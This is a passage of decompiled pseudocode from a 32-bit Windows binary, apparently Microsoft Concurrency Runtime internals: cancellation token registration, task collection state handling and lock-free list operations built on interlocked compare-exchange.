  v3 = *(_DWORD *)(this + 52);
  v4 = *(_DWORD *)(this + 116) != 0 ? -999 : -1;
  while ( v3 && v3 != *(_DWORD *)(this + 48) )
  {
    v2 = *(int *)(v3 + 4) >> 28;
    if ( (v2 & 1) != 0 )
    {
      v5 = (*(_BYTE *)(v3 + 24) & 3) == 0;
    }
    else
    {
      LOBYTE(v2) = sub_4796AD((_DWORD *)v3);
      v5 = (_BYTE)v2 == 0;
    }
    if ( !v5 )
    {
      v4 = (16 * *(_DWORD *)(v3 + 4)) >> 4;
      break;
    }
    v2 = sub_4789AE((_DWORD *)v3);
    v3 = v2;
  }
  for ( i = -1; i == -1 || v4 >= i; i = v2 )
  {
    v2 = _InterlockedCompareExchange(v8, v4, i);
    if ( v2 == i )
      break;
  }
  return v2;
}

//----- (00478531) --------------------------------------------------------
void __thiscall sub_478531(volatile signed __int32 *this)
{
  _InterlockedIncrement(this + 25);
}

//----- (00478536) --------------------------------------------------------
char __thiscall sub_478536(int *this)
{
  int *v2; // esi

  v2 = (int *)this[8];
  if ( v2 )
  {
    this[8] = 0;
    if ( v2[20] <= v2[19] )
    {
      if ( v2[28] )
        sub_4783D0((int)v2, 0);
      else
        v2[18] = 0;
      sub_478609((PSLIST_HEADER)(this[6] + 88), (signed __int32)v2, v2[17], 1);
    }
    else
    {
      sub_4783D0((int)v2, 0);
      sub_47F8BF((_DWORD *)this[6], (int)v2);
    }
  }
  return sub_4780AD(this);
}

//----- (0047858D) --------------------------------------------------------
_DWORD *__thiscall sub_47858D(_DWORD *this, _DWORD *a2, int a3)
{
  int v3; // edi
  _DWORD *v4; // esi
  _DWORD *v5; // edx
  int v6; // eax

  v3 = this[2];
  v4 = 0;
  v5 = *(_DWORD **)(v3 + 4 * a3);
  if ( !v5 )
    return 0;
  while ( 1 )
  {
    v6 = *v5;
    if ( v5[1] == *a2 )
      break;
    v4 = v5;
    v5 = (_DWORD *)*v5;
    if ( !v6 )
      return 0;
  }
  if ( v4 )
    *v4 = v6;
  else
    *(_DWORD *)(v3 + 4 * a3) = v6;
  --this[1];
  return v5;
}

//----- (004785DB) --------------------------------------------------------
_DWORD *__thiscall sub_4785DB(_DWORD *this, _DWORD **a2)
{
  _DWORD *result; // eax

  *a2[1] = *a2;
  (*a2)[1] = a2[1];
  result = (_DWORD *)*this;
  if ( a2 == (_DWORD **)*this )
  {
    if ( result == (_DWORD *)result[1] )
      result = 0;
    else
      result = (_DWORD *)*result;
    *this = result;
  }
  return result;
}

//----- (00478609) --------------------------------------------------------
char __thiscall sub_478609(PSLIST_HEADER ListHead, signed __int32 a2, int a3, char a4)
{
  int v5; // eax
  int v6; // ebx
  struct _SINGLE_LIST_ENTRY *Next; // ecx
  int v8; // edi
  int v9; // eax
  int v10; // edi
  int v11; // eax
  USHORT DepthSList; // ax
  struct _SINGLE_LIST_ENTRY *v13; // eax
  struct _SINGLE_LIST_ENTRY *v15; // [esp-4h] [ebp-18h]
  int v16; // [esp-4h] [ebp-18h]

  v5 = a3 >> *(_DWORD *)&ListHead[5].Depth;
  v6 = a3 & ((int)&ListHead[5].Next.Next[-1].Next + 3);
  if ( v5 >= *(_DWORD *)&ListHead[7].Depth )
    return 0;
  Next = ListHead[7].Next.Next;
  v8 = *(_DWORD *)&ListHead[6].Depth;
  if ( v5 < (int)Next )
  {
    v10 = *(_DWORD *)(v8 + 4 * v5);
  }
  else
  {
    v9 = v5 - (_DWORD)Next;
    v10 = *(_DWORD *)(v8 + 4 * (_DWORD)Next - 4);
    if ( v9 >= 0 )
    {
      v11 = v9 + 1;
      do
      {
        v10 = *(_DWORD *)(v10 + 4);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( _InterlockedCompareExchange((volatile signed __int32 *)(*(_DWORD *)v10 + 4 * v6), 0, a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 8), v6, -2);
  if ( a4 )
  {
    DepthSList = QueryDepthSList(ListHead);
    v15 = (struct _SINGLE_LIST_ENTRY *)(a2 + 24);
    if ( DepthSList <= *(int *)&ListHead[8].Depth )
    {
      InterlockedPushEntrySList(ListHead, v15);
    }
    else
    {
      InterlockedPushEntrySList(ListHead + 1, v15);
      if ( QueryDepthSList(ListHead + 1) > *(int *)&ListHead[8].Depth
        && !sub_475B2C(*(_DWORD **)&ListHead[4].Depth)
        && !_InterlockedCompareExchange((volatile signed __int32 *)&ListHead[9], 1, 0) )
      {
        v13 = InterlockedFlushSList(ListHead + 1);
        v16 = *(_DWORD *)&ListHead[4].Depth;
        ListHead[2].Next.Next = v13;
        sub_4761CF(
          (int (__cdecl **)(int))&ListHead[2].Depth,
          (int (__cdecl *)(int))sub_477F1D,
          (int (__cdecl *)(int))ListHead,
          v16);
      }
    }
  }
  return 1;
}

//----- (004786FA) --------------------------------------------------------
void __thiscall sub_4786FA(int this, _DWORD **a2)
{
  sub_46F085((volatile signed __int32 *)(this + 4));
  sub_4785DB((_DWORD *)this, a2);
  sub_46F19F((volatile signed __int32 *)(this + 4));
}

//----- (0047872E) --------------------------------------------------------
void __thiscall sub_47872E(void *this, int a2)
{
  sub_4786FA((int)this + 80, (_DWORD **)(a2 + 92));
}

//----- (00478744) --------------------------------------------------------
BOOL __thiscall sub_478744(void *this)
{
  return sub_46F93E(dword_4F0C08, this);
}
// 4F0C08: using guessed type int dword_4F0C08;

//----- (00478753) --------------------------------------------------------
void __cdecl sub_478753(void **a1)
{
  if ( a1 )
  {
    sub_477A8C(a1);
    sub_46C87D(a1);
  }
}

//----- (00478777) --------------------------------------------------------
void __usercall sub_478777(int a1@<ecx>, int a2@<esi>)
{
  int *v2; // ebx
  int *v3; // edi
  int v4; // esi
  _DWORD *v5; // edi
  int v6; // [esp-4h] [ebp-14h]
  int v7; // [esp+0h] [ebp-10h]
  int v8; // [esp+8h] [ebp-8h] BYREF
  int v9; // [esp+Ch] [ebp-4h] BYREF

  v9 = 0;
  v2 = (int *)(a1 + 128);
  v3 = (int *)sub_4783F3((int *)(a1 + 128), &v9);
  if ( v3 )
  {
    v6 = a2;
    do
    {
      v4 = *v3;
      if ( !*v3 )
      {
        ++v9;
        v4 = sub_4783F3(v2, &v9);
      }
      if ( sub_4796B8((_DWORD *)v3[2]) )
      {
        v5 = (_DWORD *)v3[2];
        v8 = sub_47970F(v5);
        sub_478215((unsigned int *)v2, &v8, 0);
        if ( v5 )
        {
          sub_478C05(v6, v7);
          sub_46C87D(v5);
        }
      }
      v3 = (int *)v4;
    }
    while ( v4 );
  }
}
// 478777: could not find valid save-restore pair for esi
// 4787DC: variable 'v6' is possibly undefined
// 4787DC: variable 'v7' is possibly undefined
// 478C05: using guessed type _DWORD __cdecl sub_478C05(_DWORD, _DWORD);

//----- (004787F9) --------------------------------------------------------
int __thiscall sub_4787F9(
        volatile __int32 **this,
        unsigned __int8 (__cdecl *a2)(int, int),
        int a3,
        int (__cdecl *a4)(int, int))
{
  return sub_480FB1(this[8], a2, a3, a4);
}

//----- (00478805) --------------------------------------------------------
int __thiscall sub_478805(void *this)
{
  int v2; // edi
  int v3; // ebx
  int v4; // edx
  int v5; // ecx
  int v7; // [esp+10h] [ebp-18h] BYREF
  int v8; // [esp+14h] [ebp-14h]
  volatile __int32 *v9; // [esp+18h] [ebp-10h]
  int v10; // [esp+24h] [ebp-4h]

  v9 = (volatile __int32 *)*((_DWORD *)this + 4);
  sub_46FC7F(v9);
  v2 = *((_DWORD *)this + 1) - 1;
  v7 = 0;
  v8 = 0;
  v3 = 0;
  *((_DWORD *)this + 1) = v2;
  v10 = 0;
  if ( *(_DWORD *)this > v2 )
  {
    *((_DWORD *)this + 1) = v2 + 1;
  }
  else
  {
    v4 = v2 & *((_DWORD *)this + 2);
    v5 = *((_DWORD *)this + 8);
    v3 = *(_DWORD *)(*((_DWORD *)this + 7) + 4 * v4);
    v7 = *(_DWORD *)(v5 + 8 * v4);
    v8 = *(_DWORD *)(v5 + 8 * v4 + 4);
  }
  if ( *(_DWORD *)this >= v2 )
  {
    *((_DWORD *)this + 3) += *(_DWORD *)this;
    *(_DWORD *)this = 0;
    *((_DWORD *)this + 1) = 0;
    *((_DWORD *)this + 6) = 0;
    *((_BYTE *)this + 20) = 0;
  }
  if ( (v3 & 1) != 0 )
  {
    v3 &= ~1u;
    if ( !sub_477F29(&v7, 0) )
      v3 = 1;
  }
  v10 = 2;
  sub_46FCC0(v9);
  return v3;
}

//----- (0047889E) --------------------------------------------------------
int __cdecl sub_47889E(char a1, char a2, int a3, int a4)
{
  int result; // eax
  _DWORD v5[16]; // [esp+4h] [ebp-40h] BYREF

  if ( dword_4F0C68 )
  {
    memset((char *)v5 + 2, 0, 0x3Eu);
    v5[11] = 0x20000;
    LOWORD(v5[0]) = 64;
    LOBYTE(v5[1]) = a1;
    BYTE1(v5[1]) = a2;
    v5[6] = dword_4C0F8C[0];
    v5[7] = dword_4C0F8C[1];
    v5[8] = dword_4C0F8C[2];
    v5[9] = dword_4C0F8C[3];
    v5[13] = a3;
    v5[14] = a4;
    return sub_47C0C1((_DWORD *)dword_4F0C68, dword_4F0C60, dword_4F0C64, (int)v5);
  }
  return result;
}
// 4C0F8C: using guessed type _DWORD dword_4C0F8C[4];
// 4F0C60: using guessed type int dword_4F0C60;
// 4F0C64: using guessed type int dword_4F0C64;
// 4F0C68: using guessed type int dword_4F0C68;

//----- (0047890F) --------------------------------------------------------
int __stdcall sub_47890F(char a1, unsigned __int8 a2, int a3, int a4)
{
  int result; // eax

  if ( a2 <= (unsigned __int8)byte_4F0C5C )
  {
    result = dword_4F0C58;
    if ( (dword_4F0C58 & 2) != 0 )
      return sub_47889E(a1, a2, a3, a4);
  }
  return result;
}
// 4F0C58: using guessed type int dword_4F0C58;
// 4F0C5C: using guessed type char byte_4F0C5C;

//----- (0047893C) --------------------------------------------------------
int __thiscall sub_47893C(__int32 *this, int a2)
{
  __int32 v2; // esi
  __int32 v4; // ebx

  v2 = a2 - this[3];
  if ( v2 == this[1] - 1 )
    return sub_478424(this);
  if ( v2 >= this[1] || v2 < *this )
    return 0;
  v4 = _InterlockedExchange((volatile __int32 *)(this[7] + 4 * (v2 & this[2])), 0);
  if ( (v4 & 1) == 0 )
    return v4;
  v4 &= ~1u;
  if ( sub_477F29((int *)(this[8] + 8 * (v2 & this[2])), 0) )
    return v4;
  else
    return 1;
}

//----- (0047899F) --------------------------------------------------------
int __thiscall sub_47899F(_DWORD *this, int a2)
{
  return sub_47893C((__int32 *)(this[8] + 76), a2);
}

//----- (004789AE) --------------------------------------------------------
int __thiscall sub_4789AE(_DWORD *this)
{
  if ( (this[1] & 0xFFFFFFF) == 0xFFFFFFF )
    return 0;
  else
    return *this;
}

//----- (004789C2) --------------------------------------------------------
signed __int32 __cdecl sub_4789C2(volatile signed __int32 *a1, signed __int32 a2, signed __int32 a3)
{
  signed __int32 v4; // [esp+0h] [ebp-4h] BYREF

  v4 = a3;
  sub_479083(a1, &v4, a2, 5, 5);
  return v4;
}

//----- (004789E7) --------------------------------------------------------
int __thiscall sub_4789E7(int this, int a2, int a3, int a4)
{
  int result; // eax

  sub_478A12((char *)this, a4);
  *(_DWORD *)(this + 108) = a2;
  *(_DWORD *)(this + 112) = a3;
  result = this;
  *(_DWORD *)this = &Concurrency::details::CancellationTokenRegistration_TaskProc::`vftable';
  return result;
}
// 4C0CFC: using guessed type void *Concurrency::details::CancellationTokenRegistration_TaskProc::`vftable';

//----- (00478A12) --------------------------------------------------------
char *__thiscall sub_478A12(char *this, int a2)
{
  *(_DWORD *)this = &Concurrency::details::_RefCounter::`vftable';
  *((_DWORD *)this + 1) = a2;
  *(_DWORD *)this = &Concurrency::details::_CancellationTokenRegistration::`vftable';
  *((_DWORD *)this + 2) = 3;
  sub_46913A(this + 12);
  _Mtx_init_in_situ((_Mtx_t)(this + 52), 2);
  this[100] = 0;
  *((_DWORD *)this + 26) = 0;
  return this;
}
// 46913A: using guessed type _DWORD __cdecl sub_46913A(_DWORD);
// 4C0CE0: using guessed type void *Concurrency::details::_RefCounter::`vftable';
// 4C0CEC: using guessed type void *Concurrency::details::_CancellationTokenRegistration::`vftable';

//----- (00478A5B) --------------------------------------------------------
char *__thiscall sub_478A5B(char *this, int a2)
{
  sub_401780(this, a2);
  *(_DWORD *)this = &Concurrency::details::_Interruption_exception::`vftable';
  return this;
}
// 4C0CD4: using guessed type void *Concurrency::details::_Interruption_exception::`vftable';

//----- (00478A87) --------------------------------------------------------
volatile __int32 *__thiscall sub_478A87(volatile __int32 *this, int a2, char a3)
{
  int v4; // eax
  int v5; // eax
  volatile signed __int32 *v6; // edx
  signed __int32 v7; // esi
  signed __int32 i; // eax
  _DWORD *v9; // eax
  int v10; // eax

  *((_DWORD *)this + 1) |= 0xFFFFFFFu;
  *((_DWORD *)this + 2) = 0;
  *((_DWORD *)this + 4) = 0;
  *((_DWORD *)this + 5) = 0x80000000;
  *((_DWORD *)this + 6) = 0;
  *((_DWORD *)this + 14) = 0;
  sub_46DC64((_DWORD *)this + 15);
  *((_DWORD *)this + 25) = *(_DWORD *)(a2 + 100);
  *((_DWORD *)this + 27) = 0;
  *((_DWORD *)this + 30) = 0;
  *((_DWORD *)this + 33) = 0;
  *((_DWORD *)this + 34) = 0;
  v4 = sub_46EE8E();
  *((_DWORD *)this + 3) = v4;
  *this = *(_DWORD *)(v4 + 52);
  v5 = *(_DWORD *)(a2 + 8);
  *((_DWORD *)this + 2) = v5;
  if ( v5 && v5 != 2 )
    _InterlockedIncrement((volatile signed __int32 *)(v5 + 4));
  sub_4795EB(this);
  sub_46E673(this + 15);
  if ( a3 )
  {
    v6 = (volatile signed __int32 *)(*((_DWORD *)this + 25) + 104);
    v7 = *v6;
    *((_DWORD *)this + 26) = *v6;
    for ( i = _InterlockedCompareExchange(v6, (signed __int32)this, v7);
          i != v7;
          i = _InterlockedCompareExchange(
                (volatile signed __int32 *)(*((_DWORD *)this + 25) + 104),
                (signed __int32)this,
                i) )
    {
      *((_DWORD *)this + 26) = i;
      v7 = i;
    }
  }
  else
  {
    *((_DWORD *)this + 30) |= 1u;
    *((_DWORD *)this + 26) = 0;
  }
  v9 = sub_475051();
  v10 = sub_478E74(v9);
  *((_DWORD *)this + 1) &= 0xFFFFFFFu;
  *((_DWORD *)this + 32) = v10;
  return this;
}
// 46EE8E: using guessed type int sub_46EE8E(void);

//----- (00478B68) --------------------------------------------------------
char *__thiscall sub_478B68(char *this, int a2)
{
  sub_401780(this, a2);
  *(_DWORD *)this = &Concurrency::missing_wait::`vftable';
  return this;
}
// 4C0B90: using guessed type void *Concurrency::missing_wait::`vftable';

//----- (00478BD0) --------------------------------------------------------
void __thiscall sub_478BD0(void **this)
{
  if ( this[2] )
    j_j_j___free_base(this[2]);
}

//----- (00478BE0) --------------------------------------------------------
void __thiscall sub_478BE0(char *this)
{
  *(_DWORD *)this = &Concurrency::details::_CancellationTokenRegistration::`vftable';
  _Mtx_destroy_in_situ((_Mtx_t)(this + 52));
  _Cnd_destroy_in_situ((_Cnd_t)(this + 12));
  *(_DWORD *)this = &Concurrency::details::_RefCounter::`vftable';
}
// 4C0CE0: using guessed type void *Concurrency::details::_RefCounter::`vftable';
// 4C0CEC: using guessed type void *Concurrency::details::_CancellationTokenRegistration::`vftable';

//----- (00478C05) --------------------------------------------------------
void __thiscall sub_478C05(int this)
{
  bool v2; // bl
  int v3; // ecx
  int v4; // esi
  void *v5; // esi
  void *v6; // ecx
  volatile signed __int32 *v7; // ecx
  char pExceptionObject[12]; // [esp+10h] [ebp-18h] BYREF

  v2 = 0;
  if ( !sub_479689((_DWORD *)this) )
  {
    v2 = !sub_479971((_DWORD *)this, 0);
    if ( *(_DWORD *)(this + 100) == this )
    {
      v3 = *(_DWORD *)(this + 104);
      if ( v3 )
      {
        do
        {
          v4 = *(_DWORD *)(v3 + 104);
          sub_4797E9();
          v3 = v4;
        }
        while ( v4 );
      }
    }
  }
  v5 = *(void **)(this + 108);
  if ( v5 )
  {
    sub_478BD0(*(void ***)(this + 108));
    sub_46C87D(v5);
  }
  v6 = (void *)(*(_DWORD *)(this + 24) & 0xFFFFFFFC);
  if ( v6 && v6 != (void *)12 )
    sub_478D9D(v6, 1);
  v7 = *(volatile signed __int32 **)(this + 8);
  if ( v7 && v7 != (volatile signed __int32 *)2 )
    sub_4797C2(v7);
  if ( v2 )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVmissing_wait_Concurrency__);
  }
  sub_46DCFF((_DWORD *)(this + 60));
}
// 477895: using guessed type _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this);
// 4797E9: using guessed type int sub_4797E9(void);

//----- (00478D0A) --------------------------------------------------------
_DWORD *__thiscall sub_478D0A(_DWORD *this, char a2)
{
  int v4; // [esp-4h] [ebp-8h]

  v4 = this[1];
  *this = &Concurrency::details::_MallocaArrayHolder<Concurrency::event *>::`vftable';
  _freea_crt(v4);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 46C0C7: using guessed type _DWORD __cdecl _freea_crt(_DWORD);
// 4C0D0C: using guessed type void *Concurrency::details::_MallocaArrayHolder<Concurrency::event *>::`vftable';

//----- (00478D36) --------------------------------------------------------
char *__thiscall sub_478D36(char *this, char a2)
{
  sub_478BE0(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00478D58) --------------------------------------------------------
char *__thiscall sub_478D58(char *this, char a2)
{
  sub_478BE0(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00478D9D) --------------------------------------------------------
void *__thiscall sub_478D9D(void *this, char a2)
{
  __ExceptionPtrDestroy(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4AAA7C: using guessed type void __cdecl __ExceptionPtrDestroy(void *);

//----- (00478DEF) --------------------------------------------------------
_DWORD *__thiscall sub_478DEF(unsigned int *this, int a2, int a3)
{
  sub_478777((int)this, (int)this);
  return sub_47602B(this + 32, &a2, &a3);
}

//----- (00478E12) --------------------------------------------------------
_DWORD *__thiscall sub_478E12(unsigned int *this, int a2)
{
  unsigned int *v2; // edi
  _DWORD *v3; // eax
  _DWORD *v4; // esi
  int v6; // [esp+8h] [ebp-4h] BYREF

  v2 = this + 32;
  v3 = sub_4751BF(this + 32, &a2, 0);
  if ( v3 )
    v4 = (_DWORD *)v3[2];
  else
    v4 = 0;
  if ( v4 && (v4[30] & 2) != 0 )
  {
    v6 = v4[25];
    sub_478215(v2, &v6, 0);
    sub_478C05();
    sub_46C87D(v4);
    return 0;
  }
  return v4;
}

//----- (00478E74) --------------------------------------------------------
int __thiscall sub_478E74(_DWORD *this)
{
  int v2; // eax

  v2 = this[8];
  if ( !v2 )
  {
    sub_477FF0((int)this);
    v2 = this[8];
  }
  return *(_DWORD *)(v2 + 64);
}

//----- (00478E8B) --------------------------------------------------------
void __thiscall sub_478E8B(int this, char a2)
{
  volatile __int32 **v3; // eax
  int v4; // ebx
  int v5; // edi
  int i; // eax
  int v7; // ecx
  int v8; // eax
  int v9; // ecx
  volatile __int32 *v10; // eax
  int v11; // eax
  volatile __int32 **v12; // [esp+14h] [ebp-4h]

  v3 = (volatile __int32 **)sub_475051();
  v4 = *(_DWORD *)(this + 108);
  v12 = v3;
  if ( sub_47969B((_DWORD *)this) )
    v5 = 0;
  else
    v5 = *(_DWORD *)(*(_DWORD *)(this + 100) + 104);
  if ( v4 && *(_BYTE *)(v4 + 12) )
  {
    sub_478FBA((void *)this, v12);
    *(_BYTE *)(v4 + 12) = 0;
  }
  else
  {
    for ( i = *(_DWORD *)(this + 132); i > 0; i = *(_DWORD *)(this + 132) )
    {
      if ( (unsigned int)i <= 2 )
      {
        v7 = *(_DWORD *)(this + 4 * i + 108);
      }
      else
      {
        --*(_DWORD *)(v4 + 4);
        v7 = *(_DWORD *)(*(_DWORD *)(v4 + 8) + 4 * *(_DWORD *)(v4 + 4));
        i = *(_DWORD *)(this + 132);
      }
      *(_DWORD *)(this + 132) = i - 1;
      v8 = sub_47899F(v12, v7);
      v9 = v8;
      if ( !v8 )
        break;
      if ( v8 != 1 )
      {
        v10 = v12[39];
        if ( *((_BYTE *)v12 + 76) )
          ++*((_DWORD *)v10 + 3);
        else
          ++*((_DWORD *)v10 + 27);
        *(_DWORD *)(v9 + 8) = 0;
        sub_4796C0(this, v9);
      }
    }
  }
  while ( 1 )
  {
    if ( a2 || *(int *)(this + 16) > 0 || sub_479689((_DWORD *)this) || v5 )
      sub_479148(*(volatile __int32 **)(this + 100), 0, v5);
    sub_4794C3(this, v5);
    v11 = sub_47969B((_DWORD *)this) ? 0 : *(_DWORD *)(*(_DWORD *)(this + 100) + 104);
    if ( v5 == v11 )
      break;
    v5 = v11;
  }
  *(_DWORD *)(this + 132) = 0;
  if ( v4 )
    *(_DWORD *)(v4 + 4) = 0;
  if ( !a2 )
    sub_479823(this, v5);
}

//----- (00478FBA) --------------------------------------------------------
int __thiscall sub_478FBA(void *this, volatile __int32 **a2)
{
  int result; // eax
  _BYTE *v3; // eax
  bool v4; // zf
  int v5; // ecx
  void *v6; // [esp+0h] [ebp-8h] BYREF
  int v7; // [esp+4h] [ebp-4h]

  v7 = 0;
  v6 = this;
  result = sub_4787F9(
             a2,
             (unsigned __int8 (__cdecl *)(int, int))sub_479353,
             (int)&v6,
             (int (__cdecl *)(int, int))sub_479958);
  if ( v7 )
  {
    v3 = sub_475051();
    v4 = v3[76] == 0;
    v5 = *((_DWORD *)v3 + 39);
    result = v7;
    if ( v4 )
      *(_DWORD *)(v5 + 108) += v7;
    else
      *(_DWORD *)(v5 + 12) += v7;
  }
  return result;
}

//----- (00479002) --------------------------------------------------------
volatile __int32 *__thiscall sub_479002(_DWORD *this)
{
  unsigned int *v2; // ebx
  int v3; // eax
  volatile __int32 *result; // eax
  volatile __int32 *v5; // eax
  volatile __int32 *v6; // edi

  v2 = (unsigned int *)sub_46EE8E();
  v3 = sub_478E74(v2);
  if ( v2 == (unsigned int *)this[3] && v3 == this[32] )
    return this;
  result = (volatile __int32 *)sub_4782B3(v2);
  if ( !result || *((_DWORD **)result + 25) != this )
  {
    result = sub_478E12(v2, (int)this);
    if ( !result )
    {
      v5 = (volatile __int32 *)operator new(0x90u);
      v6 = 0;
      if ( v5 )
        v6 = sub_478A87(v5, (int)this, 1);
      sub_478DEF(v2, (int)this, (int)v6);
      return v6;
    }
  }
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 46EE8E: using guessed type int sub_46EE8E(void);

//----- (00479083) --------------------------------------------------------
int __cdecl sub_479083(volatile signed __int32 *a1, signed __int32 *a2, signed __int32 a3, int a4, int a5)
{
  int v5; // eax

  v5 = dword_4C0C40[6 * a4 + a5];
  if ( v5 && (v5 <= 0 || v5 >= 4 && (unsigned int)(v5 - 4) > 1) )
    return 0;
  else
    return sub_479366(a1, a2, a3);
}
// 4C0C40: using guessed type int dword_4C0C40[36];

//----- (004790F3) --------------------------------------------------------
void __thiscall sub_4790F3(int this)
{
  int v2; // ecx

  if ( !*(_DWORD *)(this + 12) )
    *(_DWORD *)(this + 12) = sub_46EE8E();
  if ( sub_480C4F((volatile signed __int32 *)this) )
  {
    v2 = *(_DWORD *)(this + 12);
    if ( (*(_DWORD *)(this + 4) & 0x8000000) != 0 )
    {
      _InterlockedIncrement((volatile signed __int32 *)(v2 + 120));
      sub_480C01((volatile signed __int32 *)this, 2);
    }
    else
    {
      sub_477D96(v2, (16 * *(_DWORD *)(this + 4)) >> 4);
      sub_480C01((volatile signed __int32 *)this, 3);
    }
    sub_477E2D(*(_DWORD *)(this + 12), this);
  }
}

//----- (00479148) --------------------------------------------------------
void __thiscall sub_479148(volatile __int32 *this, int a2, int a3)
{
  volatile __int32 *v4; // edi
  int v5; // edi
  volatile __int32 *v6; // ebx
  volatile __int32 v7; // edi
  volatile __int32 **v8; // [esp+8h] [ebp-4h]

  v4 = sub_479002(this);
  if ( sub_47991E(this, 1) )
  {
    if ( sub_47969B(v4) || v4 == this )
    {
      v6 = this + 14;
      do
      {
        while ( 1 )
        {
          v7 = *v6;
          if ( *v6 != 1 && v7 != 5 )
            break;
          v8 = (volatile __int32 **)*((_DWORD *)this + 3);
          sub_477D96((int)v8, (16 * *((_DWORD *)this + 1)) >> 4);
          if ( v7 == 5 )
            sub_478FBA((void *)this, v8);
          _InterlockedExchange(v6, 4);
        }
      }
      while ( _InterlockedCompareExchange(v6, 3, 0) != v7 );
      v5 = a2;
      sub_4792A9((int)this, a2, 1);
    }
    else
    {
      v5 = a2;
      sub_479206(this, a2);
    }
    sub_4791E7(v5, a3);
  }
}

//----- (004791E7) --------------------------------------------------------
void __stdcall sub_4791E7(int a1, int a2)
{
  while ( a2 )
  {
    sub_479206((volatile signed __int32 *)a2, a1);
    a2 = *(_DWORD *)(a2 + 104);
  }
}

//----- (00479206) --------------------------------------------------------
void __thiscall sub_479206(volatile signed __int32 *this, int a2)
{
  signed __int32 v2; // esi
  char v3; // bl
  signed __int32 v4; // edx
  signed __int32 v5; // eax
  int v6; // ecx
  volatile __int32 **v7; // [esp+Ch] [ebp-10h]
  volatile signed __int32 *v8; // [esp+10h] [ebp-Ch]
  char v9; // [esp+14h] [ebp-8h]

  v2 = *((_DWORD *)this + 14);
  v3 = 0;
  v8 = this + 14;
  v4 = 0;
  while ( 1 )
  {
    if ( v2 )
    {
      if ( v2 == 1 || v2 == 5 )
      {
        v4 = 9;
        goto LABEL_8;
      }
    }
    else
    {
      v4 = 3;
    }
    if ( !v4 )
      return;
LABEL_8:
    v5 = _InterlockedCompareExchange(v8, v4, v2);
    v6 = (int)this;
    v4 = v5;
    if ( v5 == v2 )
      break;
    v2 = v5;
  }
  v9 = 0;
  if ( v2 == 1 || v2 == 5 )
  {
    v3 = 1;
    v9 = 1;
    v7 = (volatile __int32 **)*((_DWORD *)this + 3);
    sub_477D96((int)v7, (16 * *((_DWORD *)this + 1)) >> 4);
    v6 = (int)this;
    if ( v2 == 5 )
    {
      sub_478FBA((void *)this, v7);
      v6 = (int)this;
    }
  }
  sub_4792A9(v6, a2, v9);
  if ( v3 )
    _InterlockedExchange(v8, 4);
}

//----- (004792A9) --------------------------------------------------------
void __thiscall sub_4792A9(int this, int a2, char a3)
{
  int *v4; // ebx
  int v5; // edi
  bool i; // zf
  volatile signed __int32 *v7; // [esp+14h] [ebp-10h]

  v4 = (int *)(this + 28);
  v7 = (volatile signed __int32 *)(this + 32);
  sub_46F055((volatile signed __int32 *)(this + 32));
  if ( a3 )
  {
LABEL_4:
    sub_477E2D(*(_DWORD *)(this + 12), this);
    goto LABEL_5;
  }
  if ( *(int *)(this + 48) > 0 )
  {
    v5 = *v4;
    if ( *v4 )
      goto LABEL_8;
    goto LABEL_4;
  }
LABEL_5:
  v5 = *v4;
  for ( i = *v4 == 0; ; i = v5 == *v4 )
  {
    if ( i )
      v5 = 0;
    else
LABEL_8:
      v5 = *(_DWORD *)(v5 + 4);
    if ( !v5 )
      break;
    _InterlockedExchange((volatile __int32 *)(v5 + 24), 1);
    sub_477D96(v5 - 92, -999);
    sub_477E2D(v5 - 92, 0);
  }
  sub_46F19B(v7);
}

//----- (00479353) --------------------------------------------------------
bool __cdecl sub_479353(int a1, _DWORD *a2)
{
  return *(_DWORD *)(a1 + 8) == *a2;
}

//----- (00479366) --------------------------------------------------------
int __cdecl sub_479366(volatile signed __int32 *a1, signed __int32 *a2, signed __int32 a3)
{
  signed __int32 v3; // esi
  signed __int32 v4; // eax

  v3 = *a2;
  v4 = _InterlockedCompareExchange(a1, a3, *a2);
  if ( v4 == v3 )
    return 1;
  *a2 = v4;
  return 0;
}

//----- (0047938D) --------------------------------------------------------
signed __int32 __thiscall sub_47938D(int this)
{
  volatile signed __int32 *v2; // edi
  signed __int32 result; // eax

  v2 = (volatile signed __int32 *)(this + 20);
  if ( *(_DWORD *)(this + 20) == 0x80000000 || *(_DWORD *)(this + 20) == -2147483647 )
    sub_4795A0(this);
  result = _InterlockedIncrement(v2);
  if ( !result )
    return sub_46E135((volatile signed __int32 *)(this + 28));
  return result;
}

//----- (004793BB) --------------------------------------------------------
int __thiscall sub_4793BB(int this, int a2)
{
  struct _Mtx_internal_imp_t *v3; // esi
  volatile signed __int32 *v4; // ebx
  int result; // eax
  int v6; // esi
  char v7; // [esp+1Bh] [ebp-Dh]

  v3 = (struct _Mtx_internal_imp_t *)(this + 12);
  v7 = 0;
  sub_404D40((_Mtx_t)(this + 12));
  if ( *(_DWORD *)(this + 60) )
  {
    sub_479A01((_DWORD *)(this + 60), a2);
    v4 = (volatile signed __int32 *)(a2 + 8);
    _InterlockedExchange((volatile __int32 *)(a2 + 8), 2);
    sub_4797C2((volatile signed __int32 *)a2);
  }
  else
  {
    v7 = 1;
    v4 = (volatile signed __int32 *)(a2 + 8);
  }
  result = sub_404D70(v3);
  if ( v7 )
  {
    result = sub_4789C2(v4, 1, 0);
    v6 = result;
    if ( result )
    {
      if ( result <= 0 || result >= 4 )
      {
        result = GetCurrentThreadId();
        if ( v6 != result )
        {
          result = _InterlockedExchange(v4, 2);
          if ( result != 3 )
          {
            sub_404D40((_Mtx_t)(a2 + 52));
            while ( !*(_BYTE *)(a2 + 100) )
              sub_404DA0(a2 + 12, (struct _Mtx_internal_imp_t *)(a2 + 52));
            return sub_404D70((_Mtx_t)(a2 + 52));
          }
        }
      }
    }
  }
  return result;
}

//----- (00479492) --------------------------------------------------------
int __thiscall sub_479492(int (__thiscall ***this)(void *, int))
{
  int result; // eax

  if ( this )
    return (**this)(this, 1);
  return result;
}

//----- (004794AF) --------------------------------------------------------
